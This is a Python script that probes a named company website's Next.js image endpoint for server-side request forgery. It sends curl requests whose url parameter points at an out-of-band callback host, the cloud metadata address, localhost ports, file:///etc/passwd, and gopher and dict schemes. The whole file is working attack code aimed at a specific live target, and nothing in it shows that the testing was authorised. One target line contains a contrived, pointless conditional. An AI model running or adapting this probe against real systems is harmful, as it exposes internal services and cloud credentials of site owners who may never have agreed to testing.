#!/usr/bin/env python3
"""SSRF probe on GET /_next/image?url= with OOB callback + internal targets."""
import subprocess, urllib.parse, time

HOST = "oob361eaf6c87e2.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
BASE = "https://www.infinitycapital.bh/_next/image"

targets = [
    "http://" + HOST + "/ssrf1",
    "https://" + HOST + "/ssrf2",
    "http://" + HOST + "/ssrf3.png",
    "http://" + HOST,
    "http://169.254.169.254/latest/meta-data/",
    "http://" + str(int("169", 10) * 10**0) if False else "http://169.254.169.254/",
    "http://127.0.0.1:3000/",
    "http://127.0.0.1:8080/",
    "http://localhost:3000/",
    "http://[::1]:3000/",
    "http://0.0.0.0:3000/",
    "file:///etc/passwd",
    "gopher://127.0.0.1:25/",
    "dict://127.0.0.1:11211/",
]

# sanity baseline: a known-good public image the site already uses
control = "https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"

for t in targets + [control]:
    enc = urllib.parse.quote(t, safe="")
    url = "%s?url=%s&w=640&q=75" % (BASE, enc)
    out = subprocess.run(
        ["curl", "-sk", "-o", "/tmp/imgout.bin", "--max-time", "30",
         "-w", "%{http_code}|%{size_download}|%{content_type}", url],
        capture_output=True, text=True).stdout
    tag = "CONTROL" if t == control else "PROBE  "
    print("%s %-58s -> %s" % (tag, t[:58], out))
    time.sleep(1)

print("\ndone")
